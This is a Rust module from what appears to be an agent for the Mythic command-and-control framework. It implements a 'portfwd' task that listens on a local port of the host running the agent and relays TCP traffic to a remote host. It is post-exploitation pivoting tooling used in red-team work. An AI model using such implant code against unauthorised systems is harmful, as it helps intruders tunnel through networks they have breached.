use crate::agent::AgentTask;
use crate::mythic_continued;
use serde::Deserialize;
use std::result::Result;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc;
use std::{error::Error, sync::Arc};
use tokio::{
    net::{TcpListener, TcpStream},
    runtime::Runtime,
};

/// Struct for parsing the arguments of the `portfwd` command parameters
#[derive(Deserialize)]
struct RedirectArgs {
    bindhost: String,
    bindport: u32,
    connecthost: String,
    connectport: u32,
}

/// Sets up a port forward on the machine listening for TCP connections and
/// forwarding them to a remote IP and port
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
pub fn setup_redirect(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Grab the inital task information
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;

    // Parse the task parameters
    let args: RedirectArgs = serde_json::from_str(&task.parameters)?;

    // Initialize a new async runtime
    let rt = Runtime::new()?;

    // Start the async runtime
    rt.block_on(async {
        // Setup a TCP listener on the specified bindhost and port
        let listener = TcpListener::bind(format!("{}:{}", args.bindhost, args.bindport)).await?;

        // Notify Mythic that the portfwd has started
        tx.send(mythic_continued!(
            task.id,
            "listening...",
            format!("Listening on {}:{}", args.bindhost, args.bindport)
        ))?;

        let _ = rx.recv();

        // Create a flag to signify if the portfwd should exit
        let exit_portfwd = Arc::new(AtomicBool::new(false));
        let exit_portfwd_ref = exit_portfwd.clone();

        // Spawn a new aysnc routine to listen for new connections
        tokio::spawn(async move {
            // Loop continuously until the exit flag is set
            loop {
                // Listen for new connections
                let (client, _) = match listener.accept().await {
                    Ok(c) => c,
                    Err(_) => continue,
                };

                // Check if the portfwd should exit
                if exit_portfwd_ref.load(Ordering::SeqCst) {
                    return;
                }

                // Connect to the specified connecthost and port
                let stream =
                    match TcpStream::connect(format!("{}:{}", args.connecthost, args.connectport))
                        .await
                    {
                        Ok(s) => s,
                        Err(_) => continue,
                    };

                // Create a new reference to the exit handle for passing into a
                // new async routine
                let exit_portfwd_handle = exit_portfwd_ref.clone();

                // Spawn a new async routine which will handle the TCP forwarding
                tokio::spawn(async move {
                    let _ = handle_connection(exit_portfwd_handle, client, stream).await;
                });
            }
        });

        // Block until a message is received from Mythic.
        // Since Mythic will not send messages, this will block until the sending
        // end of the channel closes. The sending end of the channel will close
        // when the background job was killed.
        let _ = rx.recv();

        // Signify the portfwd should exit
        exit_portfwd.store(true, Ordering::SeqCst);

        // Create a connection to the portfwd to trigger the exit
        let _ = TcpStream::connect(format!("{}:{}", args.bindhost, args.bindport)).await?;

        Ok(())
    })
}

/// Function which will handle a new TCP connection to the portfwd
/// * `exit_handle` - Flag for signifying if the portfwd should exit
/// * `client` - Stream of the client connection
/// * `remote` - Stream of the connection which the client is being forwarded to
async fn handle_connection(
    exit_handle: Arc<AtomicBool>,
    client: TcpStream,
    remote: TcpStream,
) -> Result<(), Box<dyn Error>> {
    // Loop continuously until the portfwd should exit
    loop {
        // Check the exit handle and break if the portfwd should exit
        if exit_handle.load(Ordering::SeqCst) {
            break;
        }

        // Concurrently listen on each stream until there is data then pass along
        // that data to the other stream
        tokio::select! {
            _ = client.readable() => {
                let mut buffer = Vec::with_capacity(1024);
                match client.try_read_buf(&mut buffer) {
                    Ok(0) => {
                        return Ok(());
                    }
                    Ok(_) => {
                        remote.try_write(&buffer)?;
                    }
                    Err(ref e) if e.kind() == tokio::io::ErrorKind::WouldBlock => {
                        continue;
                    }
                    Err(e) => {
                        return Err(e.into());
                    }
                }
            },
            _ = remote.readable() => {
                let mut buffer = Vec::with_capacity(1024);
                match remote.try_read_buf(&mut buffer) {
                    Ok(0) => {
                        return Ok(());
                    },
                    Ok(_) => {
                        client.try_write(&buffer)?;
                    }
                    Err(ref e) if e.kind() == tokio::io::ErrorKind::WouldBlock => {
                        continue;
                    }
                    Err(e) => {
                        return Err(e.into());
                    },
                }
            },
        };
    }

    Ok(())
}
